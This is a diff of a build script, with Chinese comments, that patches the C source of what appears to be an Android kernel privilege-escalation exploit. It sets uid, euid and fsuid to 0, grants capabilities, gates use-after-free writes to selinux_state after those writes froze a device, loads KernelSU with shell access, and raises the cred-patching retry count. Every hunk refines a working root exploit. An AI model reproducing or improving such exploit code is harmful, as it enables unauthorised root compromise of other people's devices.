@@ -79,8 +79,8 @@ patch_macro "$T/ctest.c" BLOB_SITE_B "$BLOB_B"
 grep -E "^#define[[:space:]]+(LINK_|CRED_SITE|BLOB_SITE)" "$T/ctest.c" | sed 's/^/  ctest.c: /'
 
 # —— 策略补丁 ——
-# 期望次数必须写对：fast 链与 all 链里 permissive/loadksu 各一份，
-# patch_agent 与 caps 循环各一份。
+# 默认路径（不设 C99491_PERMISSIVE）完全不写 selinux_state：
+# 实测在 Enforcing 下往 selinux_state 写会卡死设备，必须先去掉这条路径。
 python3 - "$T/ctest.c" <<'PY'
 import sys, io
 
@@ -93,9 +93,7 @@ def sub_n(text, old, new, what, want=1):
         raise SystemExit("补丁失败：%s 期望 %d 次，实际 %d 次" % (what, want, n))
     return text.replace(old, new)
 
-# 1) uid/euid/fsuid 一起改成 0，并补全能力位。
-#    实测：只改 fsuid 时，run 出去的脚本仍是 uid=2000 且有效集有、permitted 空，
-#    execve 会把能力清空 —— 所以必须让 permitted/ambient 真正落地。
+# 1) uid/euid/fsuid 一起改 0，并补全能力位（exec 后靠 ambient 保住）
 src = sub_n(
     src,
     "    patch_agent(pid, cred, 0, 1);\n",
@@ -104,7 +102,7 @@ src = sub_n(
     1,
 )
 
-# 2) permissive 默认跳过：只在 C99491_PERMISSIVE=1 时尝试
+# 2) permissive 只在显式要求时尝试
 src = sub_n(
     src,
     "    if (try_permissive(st) < 0) {",
@@ -113,7 +111,16 @@ src = sub_n(
     2,
 )
 
-# 3) 装载方式：手工符号表 -> ksud late-load
+# 3) initialized 循环里的写同样关掉（这是上次卡死的嫌疑点）
+src = sub_n(
+    src,
+    "            uaf_write_once(st + 1, 1024, 0);\n",
+    "            if (getenv(\"C99491_PERMISSIVE\")) uaf_write_once(st + 1, 1024, 0);\n",
+    "initialized 写按需",
+    2,
+)
+
+# 4) 装载方式：手工符号表 -> ksud late-load
 src = sub_n(
     src,
     "        int n = snprintf(c, sizeof(c), \"loadksu %#llx allow_shell=1\\n\", slide);",
@@ -122,7 +129,7 @@ src = sub_n(
     2,
 )
 
-# 4) caps 修补轮数 12 -> 40（实测前几轮会 miss，轮数不够就放弃）
+# 5) caps 修补轮数 12 -> 40
 src = sub_n(
     src,
     "for (int r = 0; r < 12 && !(li && lp && lb && la); r++)",
@@ -132,7 +139,7 @@ src = sub_n(
 )
 
 io.open(path, "w", encoding="utf-8").write(src)
-print("策略补丁已应用：root+caps / permissive 按需 / ksud 装载 / caps 轮数 40")
+print("策略补丁已应用：root+caps / 不写 selinux_state / ksud 装载 / caps 40 轮")
 PY
 
 # —— Android system_properties 垫片 ——
@@ -193,7 +200,7 @@ build tinycred   "$T/tinycred.c"
   echo "cred_site_low21=$CRED_SITE"
   echo "blob_site_a=$BLOB_A"
   echo "blob_site_b=$BLOB_B"
-  echo "patches=root+caps,permissive-optional,ksud-load,caps-rounds40"
+  echo "patches=root+caps,no-selinux-write,ksud-load,caps-rounds40"
   echo "built_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
   for f in "$OUT"/*; do
     case "$f" in *.b64|*.txt) continue;; esac
